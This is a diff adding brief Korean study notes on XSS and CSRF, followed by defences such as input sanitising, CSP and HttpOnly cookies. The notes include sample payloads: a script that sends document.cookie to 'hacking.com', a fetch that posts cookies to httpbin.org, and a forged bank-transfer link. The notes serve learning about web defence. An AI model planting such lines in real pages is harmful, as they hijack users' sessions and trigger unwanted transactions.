@@ -1,0 +1,17 @@
+xss
+피해자의 브라우저에 공격자가 심어넣은 script가 돌 수 있게 하는것
+window.location = "hacking.com?cookie=" + document.cookie; -> session hijacking
+
+csrf (cross site request forgery)
+유해한 웹사이트를 만들고 피해자가 진입했을때,원치않은 요청이 벌어지는 것
+<a href="http://bank.com/transfer.do?acct=Attacker&amount;=$1000">Read</a>
+fetch("//httpbin.org/post", {method: "POST", body: document.cookie});
+
+Content-Security-Policy
+
+추구해야하는 것
+Sanitize input
+No eval
+No document.write
+Content Security Policy
+Secure + HttpOnly Cookie
